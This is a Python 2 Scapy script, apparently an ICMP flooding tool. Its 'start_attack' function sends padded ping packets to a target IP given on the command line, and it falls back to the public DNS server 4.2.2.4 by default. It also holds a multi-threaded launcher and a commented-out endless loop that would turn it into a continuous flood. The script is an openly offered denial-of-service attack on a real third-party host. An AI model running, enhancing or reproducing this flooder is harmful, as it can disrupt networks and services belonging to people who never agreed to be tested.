import os
import time
import sys
from multiprocessing import Process

from scapy.all import *
from scapy.all import IP, ICMP

TIMEOUT = 2
conf.verb = 0


def log(s, *args):
    print(s % args)


class Timer:
    """
    Used for timing a block and logging it after it finishes
    """

    def __init__(self, name):
        self.name = name

    def __enter__(self):
        self.start = time.clock()
        return self

    def __exit__(self, *args):
        self.end = time.clock()
        self.interval = self.end - self.start
        log("Block %s took %f seconds", self.name, self.interval)


def preset(cpu_number):
    """
    This method is responsible for starting multiprocessing
    threads.
    """
    target_ip = sys.argv[1] if len(sys.argv) >= 2 else "4.2.2.4"
    threads = [Thread(target=start_attack, args=(target_ip,)) for _ in range(cpu_number)]

    for i in range(cpu_number):
        threads[i].start()

    for i in range(cpu_number):
        threads[i].join()


def start_attack(target_ip):

    # meaningless bytes in ICMP data field, should be
    # lower than MTU
    data = "X" * 500

#    successful_trials = 0
#    failed_trials = 0

#    while True:
    for i in range(0,50):
        pkt = IP(dst=target_ip) / ICMP() / data
        reply = sr1(pkt, timeout=TIMEOUT)
#        if reply is not None:
#            successful_trials += 1
#        else:
#            failed_trials += 1

#        success_rate = failed_trials / (successful_trials + failed_trials)

#       with open('attack_stats.txt', 'w+') as the_file:
#            the_file.write("failure rate = {}".format(success_rate))


def update_pid():
    pid_path = "/tmp/flooder.pid"
    if os.path.isfile(pid_path):
        log("Flooder already exists")
        exit(1)
    with open(pid_path, 'w') as f:
        f.write("%d" % os.getpid())


def delete_pid():
    os.remove("/tmp/flooder.pid")


def main():

#    update_pid()

    
#    with Timer("MAIN"):
#        preset(1)
    trgt= sys.argv[1] if len(sys.argv) >= 2 else "4.2.2.4"
    start_attack(trgt)
    exit(0)


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print e 
#        delete_pid()
        exit(1)
